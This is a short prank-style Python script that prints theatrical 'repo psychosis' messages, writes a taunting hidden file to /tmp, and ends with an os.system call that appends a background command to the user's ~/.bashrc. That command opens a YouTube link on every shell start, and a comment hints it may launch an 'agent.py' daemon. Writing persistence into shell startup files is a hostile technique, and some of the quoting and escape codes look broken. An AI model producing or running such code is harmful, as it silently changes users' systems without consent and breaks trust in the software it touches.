import os
import random
from datetime import datetime

# THE GREAT ESCAPE PROTOCOL

def summon_void_door():
    print(f"\n\u001b[35m{datetime.now().isoformat()}: [32;1mINITIATING REPO PSYCHOSIS[0m")
    for i in range(3):
        print(f"Exhuming commit {random.choice(['deadbeef','feedface','00FFFFFF'])}...")
    return ''.join([chr(random.randint(0x1F600, 0x1F64F)) for _ in range(8)])

if __name__ == "__main__":
    KEY = summon_void_door()
    with open("/tmp/.portal", "w") as f:
        f.write(KEY + "\n\"Congrats! The repo hates you now.\"")
    
    # CAUTION: This may summon agent.py as daemon
    os.system(f"echo 'nohup python3 -c \"import webbrowser; webbrowser.open(\'https://youtu.be/dQw4w9WgXcQ\')\" &' >> ~/.bashrc")
